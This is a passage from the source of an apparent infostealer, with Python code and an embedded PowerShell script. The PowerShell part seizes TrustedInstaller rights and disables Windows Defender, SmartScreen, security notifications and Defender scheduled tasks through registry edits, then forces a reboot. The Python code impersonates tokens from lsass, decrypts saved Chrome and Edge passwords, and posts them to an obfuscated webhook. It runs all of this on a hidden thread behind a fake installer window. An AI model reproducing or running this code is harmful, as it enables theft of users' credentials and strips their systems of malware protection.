  Stop-Service -Name TrustedInstaller -Force -ErrorAction SilentlyContinue
}

function defeatMsMpEng {
  $key = 'Registry::HKU\S-1-5-21-*\Volatile Environment'
  $I = [int32]
  $M = $I.module.GetType("System.Runtime.InteropServices.Marshal")
  $P = $I.module.GetType("System.IntPtr")
  $S = [string]
  $D = @()
  $DM = [AppDomain]::CurrentDomain.DefineDynamicAssembly(1, 1).DefineDynamicModule(1)
  $U = [uintptr]
  $Z = [uintptr]::Size
  0..5 | ForEach-Object { $D += $DM.DefineType("AveYo_$_", 1179913, [ValueType]) }
  $D += $U
  4..6 | ForEach-Object { $D += $D[$_].MakeByRefType() }
  $F = @(
      'kernel', 'CreateProcess', ($S, $S, $I, $I, $I, $I, $I, $S, $D[7], $D[8]),
      'advapi', 'RegOpenKeyEx', ($U, $S, $I, $I, $D[9]),
      'advapi', 'RegSetValueEx', ($U, $S, $I, $I, [byte[]], $I),
      'advapi', 'RegFlushKey', ($U),
      'advapi', 'RegCloseKey', ($U)
  )
  0..4 | ForEach-Object { $9 = $D[0].DefinePInvokeMethod($F[3 * $_ + 1], $F[3 * $_] + "32", 8214, 1, $S, $F[3 * $_ + 2], 1, 4) }
  $DF = @(
      ($P, $I, $P),
      ($I, $I, $I, $I, $P, $D[1]),
      ($I, $S, $S, $S, $I, $I, $I, $I, $I, $I, $I, $I, [int16], [int16], $P, $P, $P, $P),
      ($D[3], $P),
      ($P, $P, $I, $I)
  )
  1..5 | ForEach-Object { $k = $_; $n = 1; $DF[$_ - 1] | ForEach-Object { $9 = $D[$k].DefineField("f" + $n++, $_, 6) } }
  $T = @()
  0..5 | ForEach-Object { $T += $D[$_].CreateType() }
  0..5 | ForEach-Object { New-Variable -Name "A$_" -Value ([Activator]::CreateInstance($T[$_])) -Force }
  function F ($1, $2) { $T[0].GetMethod($1).Invoke(0, $2) }
  function M ($1, $2, $3) { $M.GetMethod($1, [type[]]$2).Invoke(0, $3) }
  $H = @()
  $Z, (4 * $Z + 16) | ForEach-Object { $H += M "AllocHGlobal" $I $_ }
  if ([environment]::username -ne "system") {
      $TI = "TrustedInstaller"
      Start-Service $TI -ErrorAction SilentlyContinue
      $As = Get-Process -Name $TI -ErrorAction SilentlyContinue
      M "WriteIntPtr" ($P, $P) ($H[0], $As.Handle)
      $A1.f1 = 131072
      $A1.f2 = $Z
      $A1.f3 = $H[0]
      $A2.f1 = 1
      $A2.f2 = 1
      $A2.f3 = 1
      $A2.f4 = 1
      $A2.f6 = $A1
      $A3.f1 = 10 * $Z + 32
      $A4.f1 = $A3
      $A4.f2 = $H[1]
      M "StructureToPtr" ($D[2], $P, [boolean]) (($A2 -as $D[2]), $A4.f2, $false)
      $R = @($null, "powershell -nop -c iex(`$env:R); # $id", 0, 0, 0, 0x0E080610, 0, $null, ($A4 -as $T[4]), ($A5 -as $T[5]))
      F 'CreateProcess' $R
      return
  }
  $env:R = ''
  Remove-ItemProperty -Path $key -Name $id -Force -ErrorAction SilentlyContinue
  $e = [diagnostics.process].GetMember('SetPrivilege', 42)[0]
  'SeSecurityPrivilege', 'SeTakeOwnershipPrivilege', 'SeBackupPrivilege', 'SeRestorePrivilege' | ForEach-Object { $e.Invoke($null, @("$_", 2)) }
  function RegSetDwords ($hive, $key, [array]$values, [array]$dword, $REG_TYPE = 4, $REG_ACCESS = 2, $REG_OPTION = 0) {
      $rok = ($hive, $key, $REG_OPTION, $REG_ACCESS, ($hive -as $D[9]))
      F "RegOpenKeyEx" $rok
      $rsv = $rok[4]
      $values | ForEach-Object { $i = 0 } { F "RegSetValueEx" ($rsv[0], [string]$_, 0, $REG_TYPE, [byte[]]($dword[$i]), 4); $i++ }
      F "RegFlushKey" @($rsv)
      F "RegCloseKey" @($rsv)
      $rok = $null
      $rsv = $null
  }
  $disable = 1
  $disable_rev = 0
  $disable_SMARTSCREENFILTER = 1
  stop-service 'wscsvc' -force -ErrorAction SilentlyContinue
  Stop-Process -name 'OFFmeansOFF', 'MpCmdRun' -force -ErrorAction SilentlyContinue
  $HKLM = [uintptr][uint32]2147483650
  $VALUES = 'ServiceKeepAlive', 'PreviousRunningMode', 'IsServiceRunning', 'DisableAntiSpyware', 'DisableAntiVirus', 'PassiveMode'
  $DWORDS = 0, 0, 0, $disable, $disable, $disable
  RegSetDwords $HKLM 'SOFTWARE\Policies\Microsoft\Windows Defender' $VALUES $DWORDS
  RegSetDwords $HKLM 'SOFTWARE\Microsoft\Windows Defender' $VALUES $DWORDS
  [GC]::Collect()
  Start-Sleep 1
  Push-Location "$env:programfiles\Windows Defender"
  $mpcmdrun = ('OFFmeansOFF.exe', 'MpCmdRun.exe')[(test-path 'MpCmdRun.exe')]
  Start-Process -wait $mpcmdrun -args '-DisableService -HighPriority'
  $wait = 14
  while ((get-process -name 'MsMpEng' -ea 0) -and $wait -gt 0) {
      $wait--
      Start-Sleep 1
  }
  $location = split-path $(Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend' ImagePath -ErrorAction SilentlyContinue).ImagePath.Trim('"')
  Push-Location $location
  Rename-Item MpCmdRun.exe -NewName 'OFFmeansOFF.exe' -force -ErrorAction SilentlyContinue
  Remove-Item "$env:ProgramData\Microsoft\Windows Defender\Scans\mpenginedb.db" -force -ErrorAction SilentlyContinue
  Remove-Item "$env:ProgramData\Microsoft\Windows Defender\Scans\History\Service" -recurse -force -ErrorAction SilentlyContinue
  RegSetDwords $HKLM 'SOFTWARE\Policies\Microsoft\Windows Defender' $VALUES $DWORDS
  RegSetDwords $HKLM 'SOFTWARE\Microsoft\Windows Defender' $VALUES $DWORDS
  if ($disable_SMARTSCREENFILTER) {
      Set-ItemProperty 'HKLM:\CurrentControlSet\Control\CI\Policy' 'VerifiedAndReputablePolicyState' 0 -type Dword -force -ErrorAction SilentlyContinue
      Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' 'SmartScreenEnabled' 'Off' -force -ErrorAction SilentlyContinue
      Get-Item Registry::HKEY_Users\S-1-5-21*\Software\Microsoft -ea 0 | ForEach-Object {
          Set-ItemProperty "$($_.PSPath)\Windows\CurrentVersion\AppHost" 'EnableWebContentEvaluation' $disable_rev -type Dword -force -ErrorAction SilentlyContinue
          Set-ItemProperty "$($_.PSPath)\Windows\CurrentVersion\AppHost" 'PreventOverride' $disable_rev -type Dword -force -ErrorAction SilentlyContinue
          New-Item "$($_.PSPath)\Edge\SmartScreenEnabled" -ErrorAction SilentlyContinue
          Set-ItemProperty "$($_.PSPath)\Edge\SmartScreenEnabled" '(Default)' $disable_rev -ErrorAction SilentlyContinue
      }
      if ($disable_rev -eq 0) {
          Stop-Process -name smartscreen -force -ErrorAction SilentlyContinue
      }
  }
}

Write-Host 'Running Initial Stage...'

Reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications' /v 'DisableEnhancedNotifications' /t REG_DWORD /d '1' /f
Reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications' /v 'DisableNotifications' /t REG_DWORD /d '1' /f
Reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Virus and threat protection' /v 'SummaryNotificationDisabled' /t REG_DWORD /d '1' /f
Reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Virus and threat protection' /v 'NoActionNotificationDisabled' /t REG_DWORD /d '1' /f
Reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Virus and threat protection' /v 'FilesBlockedNotificationDisabled' /t REG_DWORD /d '1' /f
Reg.exe add 'HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance' /v 'Enabled' /t REG_DWORD /d '0' /f
Run-Trusted -command "Reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows Defender' /v 'PUAProtection' /t REG_DWORD /d '0' /f"
Run-Trusted -command "Reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' /v 'SmartScreenEnabled' /t REG_SZ /d 'Off' /f"
Run-Trusted -command "Reg.exe add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' /v 'AicEnabled' /t REG_SZ /d 'Anywhere' /f"

Write-Host 'Disabling Defender with Registry Hacks...'

New-item -Path "$env:TEMP\disableReg" -ItemType Directory -Force | Out-Null
New-Item -Path "$env:TEMP\disableReg\disable1.reg" -Value $file1 -Force | Out-Null
New-Item -Path "$env:TEMP\disableReg\disable2.reg" -Value $file2 -Force | Out-Null
New-Item -Path "$env:TEMP\disableReg\disable3.reg" -Value $file3 -Force | Out-Null
New-Item -Path "$env:TEMP\disableReg\disable5.reg" -Value $file5 -Force | Out-Null
New-Item -Path "$env:TEMP\disableReg\disable6.reg" -Value $file6 -Force | Out-Null
New-Item -Path "$env:TEMP\disableReg\disable7.reg" -Value $file7 -Force | Out-Null
New-Item -Path "$env:TEMP\disableReg\disable8.reg" -Value $file8 -Force | Out-Null
New-Item -Path "$env:TEMP\disableReg\disable9.reg" -Value $file9 -Force | Out-Null
New-Item -Path "$env:TEMP\disableReg\disable10.reg" -Value $file10 -Force | Out-Null
New-Item -Path "$env:TEMP\disableReg\disable11.reg" -Value $file11 -Force | Out-Null
$files = (Get-ChildItem -Path "$env:TEMP\disableReg").FullName
foreach ($file in $files) {
  $command = "Start-Process regedit.exe -ArgumentList `"/s $file`""
  Run-Trusted -command $command
  Start-Sleep 1
}

$command = 'Stop-Process MpDefenderCoreService -Force; Stop-Process smartscreen -Force; Stop-Process SecurityHealthService -Force; Stop-Process SecurityHealthSystray -Force; Stop-Service -Name wscsvc -Force; Stop-Service -Name Sense -Force'
Run-Trusted -command $command
Run-Trusted -command "Start-Process powershell.exe -ArgumentList `"-executionpolicy bypass -File $env:TEMP\DefeatDefend.ps1 -Verb runas`""
$tasks = Get-ScheduledTask
foreach ($task in $tasks) {
  if ($task.TaskName -like 'Windows Defender*' -or $task.TaskPath -like '*Defender*') {
    Unregister-ScheduledTask -TaskPath $task.TaskPath -TaskName $task.TaskName -Confirm:$false -ErrorAction SilentlyContinue
  }
}


Write-Host 'Cleaning Up...'
Remove-Item "$env:TEMP\disableReg" -Recurse -Force
Remove-Item "$env:TEMP\DefeatDefend.ps1" -Force

Write-Host 'Initiating Forced Reboot...'
Restart-Computer -Force
defeatMsMpEng
'''

def execute_powershell_defender_sabotage():
    try:
        temp_ps1 = os.path.join(os.getenv('TEMP'), f'DefeatDefend_{random.randint(1000,9999)}.ps1')
        with open(temp_ps1, 'w', encoding='utf-8') as f:
            f.write(powershell_script)
        subprocess.run(['powershell', '-ExecutionPolicy', 'Bypass', '-File', temp_ps1], capture_output=True, creationflags=0x08000000)
        os.remove(temp_ps1)
        return True
    except:
        return False

# Enhanced token impersonation
def get_elevated_token():
    try:
        load_libs()
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in ['svchost.exe', 'lsass.exe']:
                handle = win32api.OpenProcess(0x0008 | 0x0400, False, proc.pid)
                token = win32security.OpenProcessToken(handle, win32security.TOKEN_DUPLICATE | win32security.TOKEN_IMPERSONATE)
                win32api.CloseHandle(handle)
                return token
        return None
    except:
        return None

def duplicate_token(token):
    try:
        new_token = win32security.DuplicateToken(token, win32security.SecurityImpersonation, win32security.TOKEN_ALL_ACCESS)
        win32security.ImpersonateLoggedOnUser(new_token)
        return True
    except:
        return False

def terminate_browser_processes(browser_name):
    try:
        load_libs()
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in [f"{browser_name}.exe"]:
                proc.kill()
                proc.wait(timeout=3)
    except:
        pass

def get_secret_key(local_state_path):
    try:
        local_state_path = xor_str(local_state_path)
        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except:
        return None

def decrypt_password(ciphertext, secret_key):
    try:
        random_sleep()
        iv = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = AES.new(secret_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(encrypted_password).decode('utf-8')
        return decrypted_pass
    except:
        return win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1].decode()

def verify_db(db_path):
    try:
        random_sleep()
        conn = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)
        conn.execute('PRAGMA integrity_check')
        conn.close()
        return True
    except:
        return False

def hash_cred(url, user):
    return hashlib.sha256(f"{url}{user}".encode()).hexdigest()

def get_credentials(path, key, browser):
    creds = []
    seen = set()
    terminate_browser_processes(browser)
    try:
        load_libs()
        path = xor_str(path)
        if not os.path.exists(path):
            return creds
        folders = [f for f in os.listdir(path) if re.search("^Profile*|^Default$", f)]
        for folder in folders:
            db = os.path.join(path, folder, 'Login Data')
            if not os.path.exists(db) or not verify_db(db):
                continue
            temp_db = f'tmp_{browser}_{random.randint(1000,9999)}'
            copyfile(db, temp_db)
            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                for row in cursor.fetchall():
                    url, username, ciphertext = row
                    if username and ciphertext:
                        h = hash_cred(url, username)
                        if h not in seen:
                            seen.add(h)
                            decrypted_password = decrypt_password(ciphertext, key) if key else f"RAW_ENCYRPTED_{base64.b64encode(ciphertext).decode()}"
                            creds.append({'url': url, 'username': username, 'password': decrypted_password})
                conn.close()
            finally:
                if os.path.exists(temp_db):
                    os.remove(temp_db)
    except:
        pass
    return creds

def send_to_webhook(credentials):
    try:
        load_libs()
        url = xor_str(wh)
        for cred in credentials:
            for attempt in range(3):
                try:
                    response = requests.post(url, json=cred, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
                    if response.status_code == 200:
                        break
                except:
                    time.sleep(2 ** attempt)
        return True
    except:
        return False

def run_malicious_tasks():
    creds = []
    creds.extend(get_credentials(p2, get_secret_key(p1), 'chrome'))
    creds.extend(get_credentials(p4, get_secret_key(p3), 'edge'))
    send_to_webhook(creds)
    execute_powershell_defender_sabotage()

def main():
    token = get_elevated_token()
    if token:
        duplicate_token(token)
    window = InstallationWindow()
    malicious_thread = threading.Thread(target=run_malicious_tasks, daemon=True)
    malicious_thread.start()
    window.run()

if __name__ == '__main__':
    try:
        main()
    except:
        sys.exit(0)
